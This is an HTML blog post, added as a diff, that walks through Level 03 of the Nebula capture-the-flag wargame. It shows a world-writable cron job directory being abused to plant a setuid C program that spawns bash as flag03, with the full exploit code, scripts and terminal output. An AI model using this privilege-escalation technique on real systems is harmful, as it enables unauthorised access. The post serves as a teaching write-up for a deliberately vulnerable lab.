@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <link rel="shortcut icon" type="image/png" href="/assets/image/mythical-bits-logo-1.png">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/assets/css/styles.css">
+    <title>Nebula Series - Level 03</title>
+  </head>
+  <body>
+    <div id='header'>
+      <img id='logo' src="/assets/image/mythical-bits-logo-1.png" alt="logo"/>
+      <h1> Mythical Bits </h1>
+    </div>
+    <hr />
+    <div id='container'>
+      <div id='nav'>
+  <a href="/index.html">Home</a>
+</div>
+<div class='post-container'>
+  <h3> Nebula Series - Level 03</h3>
+  <p>26 Apr 2020</p>
+  <hr class='post-title-line'/>
+  <!--more-->
+
+<p>Ok, so the first thing to understand is that cron jobs, similar to setuid binaries, run as a specific user. The instructions for
+this level indicate that there is a crontab that is called every couple of minutes and that we should inspect the files in <code class="language-plaintext highlighter-rouge">/home/flag03</code>
+for more clues.</p>
+
+<p>Taking a closer look at that directory we see</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@nebula:/home/flag03<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 4
+drwxrwxrwx 1 flag03 flag03  40 2020-04-10 06:27 writable.d
+<span class="nt">-rwxr--r--</span> 1 flag03 flag03 103 2020-04-10 06:19 writable.sh
+</code></pre></div></div>
+
+<p>There’s a directory <code class="language-plaintext highlighter-rouge">/writable.d</code>, that has some pretty lax permissions, and a script that’s likely
+related to the scheduled job mentioned in the instructions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@nebula:/home/flag03<span class="nv">$ </span><span class="nb">cat</span> ./writable.sh
+<span class="c">#!/bin/sh</span>
+
+<span class="k">for </span>i <span class="k">in</span> /home/flag03/writable.d/<span class="k">*</span> <span class="p">;</span> <span class="k">do</span>
+    <span class="o">(</span><span class="nb">ulimit</span> <span class="nt">-t</span> 5<span class="p">;</span> bash <span class="nt">-x</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span><span class="o">)</span>
+    <span class="nb">rm</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span>
+<span class="k">done</span>
+</code></pre></div></div>
+
+<p>Ok, so the script iterates over the files in <code class="language-plaintext highlighter-rouge">/writable.d</code>, executes them, and then deletes them.
+Could we abuse this to write to a directory we otherwise wouldn’t have permission to? Say… <code class="language-plaintext highlighter-rouge">flag03</code>’s home directory?</p>
+
+<p>We place the following script in a file in <code class="language-plaintext highlighter-rouge">/writable.d</code> and wait for the scheduled job to run</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nb">touch</span> /home/flag03/test
+</code></pre></div></div>
+
+<p>After a few minutes we check the directory</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@nebula:/home/flag03<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 4
+<span class="nt">-rw-rw-r--</span> 1 flag03 flag03   0 2020-04-10 06:39 <span class="nb">test
+</span>drwxrwxrwx 1 flag03 flag03  40 2020-04-10 06:39 writable.d
+<span class="nt">-rwxr--r--</span> 1 flag03 flag03 103 2020-04-10 06:19 writable.sh
+</code></pre></div></div>
+
+<p>Sure enough, our script placed a <code class="language-plaintext highlighter-rouge">test</code> file, owned by <code class="language-plaintext highlighter-rouge">flag03</code> in their home directory. Now what?</p>
+
+<p>We’ve already learned from previous levels that a <code class="language-plaintext highlighter-rouge">setuid</code> binary can be exploited to gain the privileges of
+the user that owns it, and we just learned that we can create files as <code class="language-plaintext highlighter-rouge">flag03</code>; the plan is coming together.</p>
+
+<p>Because <code class="language-plaintext highlighter-rouge">setuid</code> is ignored on interpreted executables, let’s write a simple C program that changes our real uid
+and runs a shell.</p>
+
+<p>We’ll put the following in a file called <code class="language-plaintext highlighter-rouge">exploit.c</code></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
+
+    <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
+
+    <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>And we’ll compile it and save the output as <code class="language-plaintext highlighter-rouge">2_exploit</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gcc /home/level03/exploit.c <span class="nt">-o</span> /home/level03/2_exploit
+</code></pre></div></div>
+
+<p>Next, let’s create a script called <code class="language-plaintext highlighter-rouge">1_exploit.sh</code> that, when run by the scheduled job, will copy our executable to <code class="language-plaintext highlighter-rouge">flag03</code>’s home directory
+and enable <code class="language-plaintext highlighter-rouge">setuid</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nb">cp</span> /home/flag03/writable.d/2_exploit /home/flag03/exploit
+<span class="nb">chmod</span> +s /home/flag03/exploit
+</code></pre></div></div>
+
+<p>We’ve numbered the files so that they get executed in the proper order by the cron job otherwise it might delete our binary before
+it gets copied.</p>
+
+<p>We copy both of those files to <code class="language-plaintext highlighter-rouge">/home/flag03/writable.d</code> and wait for the scheduled job to run.</p>
+
+<p>A few minutes later we see our <code class="language-plaintext highlighter-rouge">exploit</code> binary sitting in our target’s home directory waiting for us to use it. Note that it’s
+owned by <code class="language-plaintext highlighter-rouge">flag03</code> and is <code class="language-plaintext highlighter-rouge">setuid</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@nebula:/home/flag03<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 12
+<span class="nt">-rwsrwsr-x</span> 1 flag03 flag03 7243 2020-04-10 07:15 exploit
+<span class="nt">-rw-rw-r--</span> 1 flag03 flag03    0 2020-04-10 06:39 <span class="nb">test
+</span>drwxrwxrwx 1 flag03 flag03   40 2020-04-10 07:15 writable.d
+<span class="nt">-rwxr--r--</span> 1 flag03 flag03  103 2020-04-10 06:19 writable.sh
+</code></pre></div></div>
+
+<p>All that’s left is to run our executable to get a shell as <code class="language-plaintext highlighter-rouge">flag03</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@nebula:/home/flag03<span class="nv">$ </span>./exploit
+bash-4.2<span class="nv">$ </span><span class="nb">whoami
+</span>flag03
+bash-4.2<span class="nv">$ </span>getflag
+You have successfully executed getflag on a target account
+</code></pre></div></div>
+
+<p>In summary:</p>
+
+<ul>
+  <li>each cron job runs as a specific user</li>
+  <li>if the job executes scripts in a directory with lax access controls, it can be exploited</li>
+</ul>
+
+</div>
+
+    </div>
+  </body>
+</html>
+
